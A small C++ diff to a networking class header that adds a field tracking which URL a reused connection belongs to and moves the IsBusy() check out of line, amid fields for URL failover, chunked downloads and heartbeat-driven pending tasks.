@@ -46,6 +46,7 @@ private:
     CHAR* urlList[16] = { 0 };   // Pointers to individual URLs in rawUrls
     ULONG urlCount = 0;
     ULONG currentUrlIndex = 0;
+    ULONG connectedUrlIndex = 0xFFFFFFFF; // Track which URL the current hConnect is for (connection reuse)
     ULONG urlFailCount[16] = { 0 };
     ULONG urlDisabledUntil[16] = { 0 };
 
@@ -102,7 +103,7 @@ public:
     ULONG GetLastDownTotal() const { return lastDownTotal; }
     void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
     // IsBusy: TRUE if we're in the middle of a multi-chunk download OR heartbeat indicated pending tasks
-    BOOL  IsBusy() const { return (downBuf != NULL) || hasPendingTasks; }
+    BOOL  IsBusy() const;
     ULONG GetDownAckOffset() const { return downAckOffset; }
 
     BOOL  WasLastQueryOk() const { return lastQueryOk; }
